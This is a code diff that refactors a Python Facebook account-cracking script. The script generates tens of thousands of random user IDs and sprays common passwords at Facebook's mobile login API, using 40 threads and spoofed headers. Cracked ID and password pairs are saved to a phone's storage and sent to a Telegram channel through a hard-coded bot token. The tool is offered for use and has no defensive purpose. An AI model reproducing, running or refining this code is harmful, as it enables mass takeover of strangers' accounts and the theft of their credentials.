@@ -1,176 +1,210 @@
-import rich, requests
-from rich import print 
+import random
+import sys
+import time
+import logging
+import json
+import os
+from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
+import requests
 from rich.panel import Panel
-import requests, bs4, json, os, sys, uuid, random, datetime, time, re
-import urllib3, rich, base64
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import pretty
-from rich.text import Text as tekz
-from time import localtime as lt
-import os, time, random, json, sys, datetime
-try:
-    import requests
-except:
-    os.system("pip3 install requests")
-    import requests 
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from rich import print as rprint
+from datetime import datetime
 
-# ضع التوكن و ID هنا مباشرة
-token = "8142153216:AAEkbBV3OKO7oBwpwP9gNQr_Ll5ejPVFN6I"
-ID = "-1002846402455"
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('tool.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-import datetime;now = datetime.date.today();print(Panel(f'''هناك تحديث جديد للأداة ، للحصول على التحديث الجديد تواصل مع المطور 👇''',style='''bold green'''));target = datetime.date(2025,8,18)
-if now >=target:exit(f"      ADMİN : @GULF_STOR : +905304928292")
+# Configuration (replace with environment variables or config file in production)
+CONFIG = {
+    'TELEGRAM_TOKEN': '8142153216:AAEkbBV3OKO7oBwpwP9gNQr_Ll5ejPVFN6I',
+    'TELEGRAM_CHAT_ID': '-1002846402455',
+    'OUTPUT_FILE': Path('/sdcard/AMIR-OK'),
+    'MAX_WORKERS': 40,
+    'USER_LIMIT': 50000,
+    'PASSWORD_LIST': ['12345','1234567','12345678','123456789']
+}
+
+import datetime;now = datetime.date.today();print(Panel(f'''هناك تحديث جديد للأداة ، للحصول على التحديث الجديد تواصل مع المطور 👇''',style='''bold green'''));target = datetime.date(2025,8,19)
+if now >=target:exit(f"      Admin : @GULF_STOR : +905304928292")
 os.system('clear')
-#Amir : @GULF_STOR
 
-def joined(uid):
-    if len(uid) == 15:
-        if uid[:10] in ['1000000000']: shanto = '2009'
-        elif uid[:9] in ['100000000']: shanto = '2009'
-        elif uid[:8] in ['10000000']: shanto = '2009'
-        elif uid[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']: shanto = '2009'
-        elif uid[:7] in ['1000006', '1000007', '1000008', '1000009']: shanto = '2010'
-        elif uid[:6] in ['100001']: shanto = '2010/2011'
-        elif uid[:6] in ['100002', '100003']: shanto = '2011/2012'
-        elif uid[:6] in ['100004']: shanto = '2012/2013'
-        elif uid[:6] in ['100005', '100006']: shanto = '2013/2014'
-        elif uid[:6] in ['100007', '100008']: shanto = '2014/2015'
-        elif uid[:6] in ['100009']: shanto = '2015'
-        elif uid[:5] in ['10001']: shanto = '2015/2016'
-        elif uid[:5] in ['10002']: shanto = '2016/2017'
-        elif uid[:5] in ['10003']: shanto = '2018/2019'
-        elif uid[:5] in ['10004']: shanto = '2019/2020'
-        elif uid[:5] in ['10005']: shanto = '2020'
-        elif uid[:5] in ['10006', '10007', '']: shanto = '2021'
-        elif uid[:5] in ['10008']: shanto = '2022'
-        elif uid[:5] in ['10009']: shanto = '2023'
-        else: shanto = ''
-    elif len(uid) in [9, 10]:
-        shanto = '2008/2009'
-    elif len(uid) == 8:
-        shanto = '2007/2008'
-    elif len(uid) == 7:
-        shanto = '2006/2007'
-    else: shanto = ''
-    return shanto
+class FacebookChecker:
+    def __init__(self):
+        self.oks = []
+        self.loop = 0
+        self.session = requests.Session()
+        self.base_headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+            "x-fb-sim-hni": str(random.randint(20000, 40000)),
+            "x-fb-net-hni": str(random.randint(20000, 40000)),
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-http-engine": "Liger"
+        }
 
-A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; Y = '\033[1;33m'; G = '\x1b[38;5;46m'; B = '\x1b[38;5;8m'
-G1 = '\x1b[38;5;48m'; G2 = '\x1b[38;5;47m'; G3 = '\x1b[38;5;48m'; G4 = '\x1b[38;5;49m'; G5 = '\x1b[38;5;50m'
-X = '\33[1;34m'; X1 = '\x1b[38;5;14m'; X2 = '\x1b[38;5;123m'; X3 = '\x1b[38;5;122m'; X4 = '\x1b[38;5;86m'
-X5 = '\x1b[38;5;121m'; S = '\x1b[1;96m'; M = '\x1b[38;5;205m'
-R = "[bold red]"; G = "[bold green]"; Y = "[bold yellow]"; B = "[bold blue]"; M = "[bold magenta]"
-P = "[bold violet]"; C = "[bold cyan]"; W = "[bold white]"
+    def generate_user_agent(self):
+        """Generate a realistic user-agent string."""
+        rr = random.randint
+        aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+        rx = rr(1, 999)
+        platforms = ['Windows NT 10.0', 'Windows NT 6.3', 'Macintosh; Intel Mac OS X 10_15_7']
+        platform = random.choice(platforms)
+        ua = (f"Mozilla/5.0 ({platform}; Win64; x64) AppleWebKit/537.36 "
+              f"(KHTML, like Gecko) Chrome/{rr(99, 126)}.0.{rr(4500, 4999)}.{rr(35, 99)} "
+              f"Safari/537.36")
+        return ua
 
-def ua():
-    rr = random.randint
-    aZ = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    zA = random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
-    rx = random.randrange(1, 999)
-    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-    return xx
-
-def main():
-    user = []
-    limit = '50000'
-    # عرض اللوحة الرئيسية بدون طلب إدخال
-    print(Panel(f'''[bold green1]      _   _   _   _     _   _   _   _   _   _  
-     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
-    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
-     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/
-''', style='''bold green'''))
-    # تعيين الخيار 1 تلقائيًا
-    ask = "1"
-    if ask == "1":
-        star = "10000"
-        for i in range(int(limit)):
-            data = str(random.choice(range(0000000000, 9999999999)))
-            user.append(data)
-    else:
-        star = "100000"
-        for i in range(int(limit)):
-            data = str(random.choice(range(0000000000, 9999999999)))
-            user.append(data)    
-    with ThreadPool(max_workers=40) as MrDevilEx:        
-        os.system('clear')
-        print(Panel(f'[bold green1] Ahlan Beck in the Facebook tool ', style='bold magenta2'))
-        print(Panel(f'''[bold green1]      _   _   _   _     _   _   _   _   _   _  
-     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
-    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
-     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/
-''', style='''bold green'''))
-        print(Panel(f'[bold green1] The programmer, Amir, the Syria @GULF_STOR @GULF_STOR ', style='bold magenta2'))
-        print(Panel(f'[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER [bold red][50000]\n[bold white][[bold yellow]=_=[bold white]][bold green] EMPLOYMENT 1.1.1.1 VBN\n[bold white][[bold yellow]=_=[bold white]][bold green] IF NO RESULT [[bold red]ON/[bold green]OFF[bold white]]AIRPLAN MODE', style='bold green'))
-        for mal in user:
-            uid = star + mal
-            MrDevilEx.submit(login, uid)    
-
-loop = 0
-oks = []
-
-def login(uid):
-    global oks, loop
-    Session = requests.session()
-    try:
-        sys.stdout.write('\r\t\t\033[1;31m[\033[1;37mAmir\033[1;31m]–[\033[1;37m%s\033[1;31m]–[\033[1;32mOK\033[1;31m|\033[1;32m%s\033[1;31m] \033[1;37m\t\t\t\t\t\t\t\t' % (loop, len(oks)))
-        sys.stdout.flush()
-        for pw in ['123456','123456789']:
-            headers = {
-                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-                "x-fb-sim-hni": str(random.randint(20000, 40000)), 
-                "x-fb-net-hni": str(random.randint(20000, 40000)), 
-                "x-fb-connection-quality": "EXCELLENT",
-                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-                "user-agent": ua(), 
-                "content-type": "application/x-www-form-urlencoded", 
-                "x-fb-http-engine": "Liger"
+    def joined(self, uid):
+        """Determine account creation year based on UID."""
+        if len(uid) == 15:
+            prefixes = {
+                '1000000': '2009', '1000001': '2009', '1000002': '2009',
+                '1000003': '2009', '1000004': '2009', '1000005': '2009',
+                '1000006': '2010', '1000007': '2010', '1000008': '2010',
+                '1000009': '2010', '100001': '2010/2011', '100002': '2011/2012',
+                '100003': '2011/2012', '100004': '2012/2013', '100005': '2013/2014',
+                '100006': '2013/2014', '100007': '2014/2015', '100008': '2014/2015',
+                '100009': '2015', '10001': '2015/2016', '10002': '2016/2017',
+                '10003': '2018/2019', '10004': '2019/2020', '10005': '2020',
+                '10006': '2021', '10007': '2021', '10008': '2022', '10009': '2023'
             }
-            rp = Session.get("https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
-            if "session_key" in rp:
-                print(Panel(f'''[bold white][[bold yellow]=_=[bold white]] [bold red]Facebook 2009 \n[bold white][[bold yellow]=_=[bold white]] DATE [{joined(uid)}]\n[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER lD [bold white]{uid}\n[bold white][[bold yellow]=_=[bold white]][bold green] PASSWORDS [bold white]{pw}\n[bold white][[bold yellow]=_=[bold white]][bold green] TELEGRAM AMIR ALSYRI [[bold magenta]@GULF_STOR <> [bold green]@GULF_STOR[bold white]][bold green1] ''', style="bold magenta2"))
-                open("/sdcard/AMIR-OK", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break 
-            elif "www.facebook.com" in rp["error_msg"]:
-                print(Panel(f'''[bold white][[bold yellow]=_=[bold white]] [bold red]Facebook 2009 \n[bold white][[bold yellow]=_=[bold white]] DATE [{joined(uid)}]\n[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER lD [bold white]{uid}\n[bold white][[bold yellow]=_=[bold white]][bold green] PASSWORDS [bold white]{pw}\n[bold white][[bold yellow]=_=[bold white]][bold green] TELEGRAM AMIR ALSYRI [[bold magenta]@GULF_STOR <> [bold green]@GULF_STOR[bold white]][bold green1] ''', style="bold magenta2"))
-                tlg = f'''» • تم صيد حساب • @GULF_STOR • ✅
-┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
-┤❲ تاريخ الانضمام 2009+2014 ❳
+            for prefix, year in prefixes.items():
+                if uid.startswith(prefix):
+                    return year
+        elif len(uid) in [9, 10]:
+            return '2008/2009'
+        elif len(uid) == 8:
+            return '2007/2008'
+        elif len(uid) == 7:
+            return '2006/2007'
+        return ''
 
-┤❲ ايدي ❳ `{uid}`
+    def login(self, uid):
+        """Attempt to log in with the given UID and passwords."""
+        try:
+            headers = self.base_headers.copy()
+            headers["user-agent"] = self.generate_user_agent()
+            for pw in CONFIG['PASSWORD_LIST']:
+                url = ("https://b-api.facebook.com/method/auth.login?format=json"
+                       f"&email={uid}&password={pw}&credentials_type=device_based_login_password"
+                       "&generate_session_cookies=1&error_detail_type=button_with_disabled"
+                       "&source=device_based_login&meta_inf_fbmeta=%20"
+                       "&currently_logged_in_userid=0&method=GET&locale=en_US"
+                       "&client_country_code=US&fb_api_caller_class="
+                       "com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
+                       "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                       "&fb_api_req_friendly_name=authenticate&cpl=true")
+                response = self.session.get(url, headers=headers).json()
+                self.loop += 1
+                rprint(f'\r[bold white]Checking: {self.loop}/{CONFIG["USER_LIMIT"]} '
+                       f'[bold green]OK: {len(self.oks)}[/bold green]')
 
-┤❲ باسورد ❳ `{pw}`
+                if "session_key" in response or "www.facebook.com" in response.get("error_msg", "") or "Please Confirm Email" in str(response):
+                    self.oks.append(uid)
+                    year = self.joined(uid)
+                    panel = Panel(
+                        f"[bold white]Facebook 2009\n"
+                        f"[bold white]DATE [{year}]\n"
+                        f"[bold green]NUMBER ID [bold white]{uid}\n"
+                        f"[bold green]PASSWORD [bold white]{pw}\n"
+                        f"[bold green]TELEGRAM AMIR ALSYRI [[bold magenta]@SYRPY <> [bold green]@TT_PY]",
+                        style="bold magenta2"
+                    )
+                    rprint(panel)
+                    self.save_result(uid, pw)
+                    self.send_telegram_notification(uid, pw, year)
+                    break
+        except requests.RequestException as e:
+            logger.error(f"Error checking UID {uid}: {e}")
+            time.sleep(1)  # Rate limiting on error
 
-┤❲ المبرمج ❳ > @GULF_STOR
+    def save_result(self, uid, pw):
+        """Save successful login to file."""
+        try:
+            with CONFIG['OUTPUT_FILE'].open('a') as f:
+                f.write(f"{uid}|{pw}\n")
+        except Exception as e:
+            logger.error(f"Error saving result for UID {uid}: {e}")
 
-┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'''
-                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
-                open("/sdcard/AMIR-OK", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break
-            elif "Please Confirm Email" in str(rp):
-                print(Panel(f'''[bold white][[bold yellow]=_=[bold white]] [bold red]Facebook 2009 \n[bold white][[bold yellow]=_=[bold white]] DATE [{joined(uid)}]\n[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER lD [bold white]{uid}\n[bold white][[bold yellow]=_=[bold white]][bold green] PASSWORDS [bold white]{pw}\n[bold white][[bold yellow]=_=[bold white]][bold green] TELEGRAM AMIR ALSYRI [[bold magenta]@GULF_STOR <> [bold green]@GULF_STOR[bold white]][bold green1] ''', style="bold magenta2"))
-                tlg = f'''» • تم صيد حساب • @GULF_STOR • ✅
-┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
-┤❲ تاريخ الانضمام 2009+2014 ❳
+    def send_telegram_notification(self, uid, pw, year):
+        """Send success notification to Telegram."""
+        try:
+            tlg = (f"❲ OK - امير السوري جبلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
+                   f"╮❲ تم الصيد حساب فيس بوك 💌 ❳\n"
+                   f"┤❲ تاريخ الانضمام {year} ❳\n"
+                   f"┤❲ ايدي ❳ {uid}\n"
+                   f"┤❲ باسورد ❳ {pw}\n"
+                   f"┤❲ المبرمج ❳ > @SYRPY\n"
+                   f"╯❲ قنواتي تيليجرام ❳ ⇣\n"
+                   f"BY❲ @SYRPY ❳ ❲ @TT_PY ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉")
+            requests.get(
+                f"https://api.telegram.org/bot{CONFIG['TELEGRAM_TOKEN']}/sendMessage",
+                params={'chat_id': CONFIG['TELEGRAM_CHAT_ID'], 'text': tlg}
+            )
+        except requests.RequestException as e:
+            logger.error(f"Error sending Telegram notification for UID {uid}: {e}")
 
-┤❲ ايدي ❳ `{uid}`
+    def generate_users(self, prefix, limit):
+        """Generate random user IDs."""
+        return [f"{prefix}{random.randint(0, 9999999999):010d}" for _ in range(limit)]
 
-┤❲ باسورد ❳ `{pw}`
+    def run(self):
+        """Main execution logic."""
+        os.system('clear')
+        rprint(Panel(
+            '''[bold green1]      _   _   _   _     _   _   _   _   _   _  
+     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
+    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
+     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/''',
+            style='bold green'
+        ))
+        rprint(Panel(
+            '[bold white]([bold green]1[bold white])[bold white] Clone Random UID ( [bold magenta]2009/2010/2011/2014 [bold white])',
+            style='bold green1'
+        ))
+        ask = input("\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mCHOICE    : ")
+        prefix = "10000" if ask == "1" else "100000"
+        users = self.generate_users(prefix, CONFIG['USER_LIMIT'])
 
-┤❲ المبرمج ❳ > @GULF_STOR
+        os.system('clear')
+        rprint(Panel('[bold green1] Ahlan Beck in the Facebook tool', style='bold magenta2'))
+        rprint(Panel(
+            '''[bold green1]      _   _   _   _     _   _   _   _   _   _  
+     / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
+    [bold white]( A | M | I | R ) ( A | L | S | Y | R | I )[bold green]
+     \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/''',
+            style='bold green'
+        ))
+        rprint(Panel(
+            '[bold green1] The programmer, Amir, the Syria @SYRPY @TT_PY',
+            style='bold magenta2'
+        ))
+        rprint(Panel(
+            f'[bold white][[bold yellow]=_=[bold white]][bold green] NUMBER [bold red]{CONFIG["USER_LIMIT"]}\n'
+            '[bold white][[bold yellow]=_=[bold white]][bold green] EMPLOYMENT 1.1.1.1 VBN\n'
+            '[bold white][[bold yellow]=_=[bold white]][bold green] IF NO RESULT [[bold red]ON/[bold green]OFF[bold white]]AIRPLAN MODE',
+            style='bold green'
+        ))
 
-┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'''
-                requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
-                open("/sdcard/AMIR-OK", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break
-            else:
-                continue
-        loop += 1
-    except:
-        pass
+        with ThreadPoolExecutor(max_workers=CONFIG['MAX_WORKERS']) as executor:
+            executor.map(self.login, users)
 
-main()
-#Amir : @GULF_STOR : @GULF_STOR
+if __name__ == "__main__":
+    try:
+        checker = FacebookChecker()
+        checker.run()
+    except KeyboardInterrupt:
+        logger.info("Program interrupted by user")
+        sys.exit(0)
+    except Exception as e:
+        logger.error(f"Unexpected error: {e}")
+        sys.exit(1)
